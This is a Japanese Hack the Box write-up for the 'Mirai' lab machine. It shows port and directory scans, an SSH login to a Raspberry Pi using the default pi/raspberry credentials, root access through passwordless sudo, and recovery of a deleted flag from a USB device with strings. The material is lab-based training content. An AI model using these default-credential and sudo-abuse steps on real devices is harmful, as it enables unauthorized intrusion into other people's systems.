---
title: "【Hack the Box write-up】Mirai"
date:  "2020-06-13T15:04:05+07:00"
author:
  - "さんぽし"
description: "【Hack the Box write-up】Mirai"
draft: false
tags: ["writeup","Hack the Box"]
categories:
  - "security"
---

## はじめに
筆者は Hack the Box 初心者です。
何か訂正や補足、アドバイスなどありましたら、コメントか Twitter までお願いします。
[さんぽし(@sanpo_shiho) | Twitter](https://twitter.com/sanpo_shiho)

## cheat sheet

以下で cheat sheet としてツールの使い方などをまとめています。参考にしてください。
[github | sanposhiho/MY_CHEAT_SHEET](https://github.com/sanposhiho/MY_CHEAT_SHEET)

## machineについて
難易度は easy です

![スクリーンショット 2020-06-13 22.16.56.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/417600/98fabdc6-7522-40f0-6440-2a9737c9e2ec.png)


## nmap

```
kali@kali:~$ nmap -sV -sC 10.10.10.48
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-12 21:13 EDT
Nmap scan report for 10.10.10.48
Host is up (0.24s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey: 
|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)
53/tcp open  domain  dnsmasq 2.76
| dns-nsid: 
|_  bind.version: dnsmasq-2.76
80/tcp open  http    lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.16 seconds

```

## gobuster

```
kali@kali:~$ gobuster dir -u http://10.10.10.48 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 40 -x php,txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================![スクリーンショット 2020-06-13 17.02.08.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/417600/b8b03733-5da0-7fbd-83a7-9efcffbecef8.png)

[+] Url:            http://10.10.10.48
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Timeout:        10s
===============================================================
2020/06/12 21:16:59 Starting gobuster
===============================================================
/admin (Status: 301)
/versions (Status: 200)
===============================================================
2020/06/12 22:31:17 Finished
===============================================================
```

## 見てみる

/versions にアクセスすると以下のファイルが DL されました

```
kali@kali:~/Downloads$ cat versions 
1592012149,,,
```
よくわかりません(&後にも使いませんでした…）

/admin を見てみます
![スクリーンショット 2020-06-13 17.02.08.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/417600/359d6859-85b7-d173-4b40-e13ec37f2f57.png)

`Pi-hole Version v3.1.4 Web Interface Version v3.1 FTL Version v2.10`らしいです

これ↓とか使えそうだなーとか思って調べてました（こっちも最後まで使いませんでした…
https://pulsesecurity.co.nz/advisories/pihole-v3.3-vulns

## sshにデフォルトのcredentialsでログイン

なんか手が出なくなってしまったので Mirai という名前に注目して調べてみました（Hack the Box ではマシンの名前がかなりでかいヒントになってる場合が時々ある）
[IoT時代のセキュリティ① マルウェア"Mirai"の衝撃～前編](https://www.japan-systems.co.jp/column/public/detail/public_detail_1491.html)

Mirai という IoT 機器に感染するマルウェアがあったっぽいですね
感染の仕組みは単純でデフォルトのパスワードを使用していると感染するようです

ちょっと待てよ…？と思い、ラズパイのデフォルトの credential を[調べてみると](https://qiita.com/aryoa/items/86ddae2212c789ddece0)pi/raspberry ということがわかったので ssh してみると

```
kali@kali:~$ ssh pi@10.10.10.48
The authenticity of host '10.10.10.48 (10.10.10.48)' can't be established.
ECDSA key fingerprint is SHA256:UkDz3Z1kWt2O5g2GRlullQ3UY/cVIx/oXtiqLPXiXMY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.48' (ECDSA) to the list of known hosts.
pi@10.10.10.48's password: 
Permission denied, please try again.
pi@10.10.10.48's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 27 14:47:50 2017 from localhost

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.


SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.
pi@raspberrypi:~ $ id
uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),117(i2c),998(gpio),999(spi)

```

ssh 接続できました。user.txt が取れます

## PE

```
pi@raspberrypi:~/Desktop $ sudo -l
Matching Defaults entries for pi on localhost:                                                                                                                                                                                             
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin                                                                                                                                 
                                                                                                                                                                                                                                           
User pi may run the following commands on localhost:                                                                                                                                                                                       
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
pi@raspberrypi:~/Desktop $ sudo bash
root@raspberrypi:/home/pi/Desktop# cd /
root@raspberrypi:/# cd root
root@raspberrypi:~# ls
root.txt
root@raspberrypi:~# cat root.txt
I lost my original root.txt! I think I may have a backup on my USB stick...

```

めっちゃ簡単やん！と思ったらこの肩透かし is 何…

## USB stickを見に行く

```
root@raspberrypi:/dev# mount
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /run type tmpfs (rw,nosuid,relatime,size=102396k,mode=755)
/dev/sda1 on /lib/live/mount/persistence/sda1 type iso9660 (ro,noatime)
/dev/loop0 on /lib/live/mount/rootfs/filesystem.squashfs type squashfs (ro,noatime)
tmpfs on /lib/live/mount/overlay type tmpfs (rw,relatime)
/dev/sda2 on /lib/live/mount/persistence/sda2 type ext4 (rw,noatime,data=ordered)
aufs on / type aufs (rw,noatime,si=67d53412,noxino)
devtmpfs on /dev type devtmpfs (rw,nosuid,size=10240k,nr_inodes=58955,mode=755)
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/lib/systemd/systemd-cgroups-agent,name=systemd)
pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=22,pgrp=1,timeout=300,minproto=5,maxproto=5,direct)
hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime)
mqueue on /dev/mqueue type mqueue (rw,relatime)
debugfs on /sys/kernel/debug type debugfs (rw,relatime)
tmpfs on /tmp type tmpfs (rw,nosuid,nodev,relatime)
/dev/sdb on /media/usbstick type ext4 (ro,nosuid,nodev,noexec,relatime,data=ordered)
tmpfs on /run/user/999 type tmpfs (rw,nosuid,nodev,relatime,size=51200k,mode=700,uid=999,gid=997)
tmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=51200k,mode=700,uid=1000,gid=1000)
```

```
root@raspberrypi:/media/usbstick# cat damnit.txt 
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James
```
:angry::angry::angry::angry:


```
root@raspberrypi:/dev# strings sdb
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
/media/usbstick
2]8^
lost+found
root.txt
damnit.txt
>r &
3d********************
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?
-James

```

/dev/sdb を無理矢理確認すると flag が取れました…

## 終わりに
<blockquote class="twitter-tweet"><p lang="ja" dir="ltr">defaultのcredentialを一番最初に試さないやつは何をやってもだめ<br>になってる</p>&mdash; さんぽし (@sanpo_shiho) <a href="https://twitter.com/sanpo_shiho/status/1271729941734776832?ref_src=twsrc%5Etfw">June 13, 2020</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

でした。なんか Pi-hole とか dnsmasq とかに良さげな脆弱性(?)がいくつかあってそっちに気を取られちゃってました…

